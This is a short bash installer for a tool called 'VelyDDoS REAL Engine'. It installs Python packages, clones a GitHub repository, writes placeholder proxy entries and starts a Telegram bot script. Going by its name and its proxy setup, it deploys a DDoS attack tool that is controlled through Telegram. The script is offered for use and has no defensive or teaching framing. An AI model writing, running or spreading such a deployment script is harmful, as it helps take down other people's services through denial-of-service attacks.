#!/bin/bash
echo "[+] Installing VelyDDoS REAL Engine..."
apt update && apt upgrade -y
apt install python3 python3-pip git -y
pip3 install telebot requests paramiko

git clone https://github.com/gxyenn/velyddos-real
cd velyddos-real

# Install requirements
pip3 install -r requirements.txt

# Setup proxy list
echo "http://proxy1:8080" > proxies.txt
echo "http://proxy2:8080" >> proxies.txt

# Run bot
echo "[+] Starting VelyDDoS REAL Engine..."
python3 bot_tele.py
